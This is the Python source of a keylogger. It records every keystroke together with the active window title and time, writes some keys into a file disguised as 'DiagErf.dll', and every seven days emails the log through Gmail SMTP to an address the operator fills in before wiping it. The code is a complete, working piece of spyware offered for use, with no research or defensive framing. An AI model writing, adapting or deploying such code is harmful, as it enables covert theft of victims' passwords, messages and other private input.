# Importing libs
from pynput import keyboard
from datetime import date, datetime
from linecache import getline
from smtplib import SMTP_SSL
from pyautogui import getActiveWindowTitle
from sys import setrecursionlimit

# Check if it's time to send the log file
day = getline("check_file", 1)
month = getline("check_file", 2)
day = int(day)
month = int(month)
last_check = date(2022, month, day)

day_today = str(date.today())
day_today = int(day_today[8:])
month_today = str(date.today())
month_today = int(month_today[5:7])
today = date(2022, month_today, day_today)
    
time = today - last_check
time = str(time)
check_time = int(time[0:1])
if check_time != 0:
    time = int(time[0:2])
    # If it's time then the log will be emailed, deleted and the last check day will be updated
    if time >= 7:
        file = open("log_file", "r")
        file_text = file.read()
        email_text = 'Subject: Your e-mail subject\n\n'
        email_text += file_text
        email_text = email_text.encode('utf-8')

        connection = SMTP_SSL('smtp.gmail.com', 465)
        connection.login('xxxxxxxxxx@gmail.com', 'xxxx xxxx xxxx xxxx') # Your email and Google App passwords crated password
        connection.sendmail('', 'xxxxxxxxxx@gmail.com', email_text)     # Your email again
        connection.quit()

        file = open('check_file', 'w')
        day_today = str(day_today)
        month_today = str(month_today)
        file.writelines(day_today + "\n" + month_today)
        file.close()
        file = open('log_file', 'r+')
        file.truncate(0)
        file.close()

# Function to put the date and name of the active window in the log file
def info():
    current_time = datetime.now()
    current_time_hour = str(current_time.hour)
    current_time_minute = str(current_time.minute)
    current_time_second = str(current_time.second)
    try:
        window_name = getActiveWindowTitle()
    except AttributeError:
        return False

    file = open('log_file', 'a')
    file.writelines("\n" +  current_time_hour + ":" + current_time_minute + ":" + current_time_second + " | " + window_name + ": ")
    file.close()
    
# Function that listens to what the user types and adds to the log file
def press(key):
    try:
        if key == keyboard.Key.esc:
            file = open('log_file', 'a')
            info()
            file.writelines("<esc>")
            file.close()
        elif key == keyboard.Key.cmd_l or key == keyboard.Key.cmd_r:
            file = open('DiagErf.dll', 'a')
            info()
            file.writelines("<win>")
            file.close()
        elif key == keyboard.Key.delete:
            file = open('DiagErf.dll', 'a')
            info()
            file.writelines("<delete>")
            file.close()
        elif key == keyboard.Key.space:
            file = open('log_file', 'a')
            info()
            file.writelines("<space>")
            file.close()
        elif key == keyboard.Key.backspace:
            file = open('log_file', 'a')
            info()
            file.writelines("<backspace>")
            file.close()
        elif key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
            file = open('log_file', 'a')
            info()
            file.writelines("<shift>")
            file.close()
        elif key == keyboard.Key.enter:
            file = open('log_file', 'a')
            info()
            file.writelines("<enter>")
            file.close()
        elif key == keyboard.Key.tab:
            file = open('log_file', 'a')
            info()
            file.writelines("<tab>")
            file.close()
        elif key == keyboard.Key.alt_gr or key == keyboard.Key.alt_l or key == keyboard.Key.alt_r or key == keyboard.Key:
            file = open('log_file', 'a')
            info()
            file.writelines("<alt>")
            file.close()
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r or key == keyboard.Key.ctrl:
            file = open('log_file', 'a')
            info()
            file.writelines("<ctrl>")
            file.close()
        elif key == keyboard.Key.caps_lock:
            file = open('log_file', 'a')
            info()
            file.writelines("<caps_lock>")
            file.close()
        elif key == keyboard.Key.left:
            file = open('log_file', 'a')
            info()
            file.writelines("<left_arrow>")
            file.close()
        elif key == keyboard.Key.right:
            file = open('log_file', 'a')
            info()
            file.writelines("<right_arrow>")
            file.close()
        else:
            file = open('log_file', 'a')
            info()
            file.writelines(f"" + "<{0}>".format(
                    key.char))
            file.close()
    except AttributeError:
        file = open('log_file', 'a')
        file.writelines('')
        file.close()

# Start the listener, if it stops working while listening, will be restarted
setrecursionlimit(10000)

def start():
    try:
        with keyboard.Listener(on_press=press) as listener:
            listener.join()
    except Exception:
        start()

start()
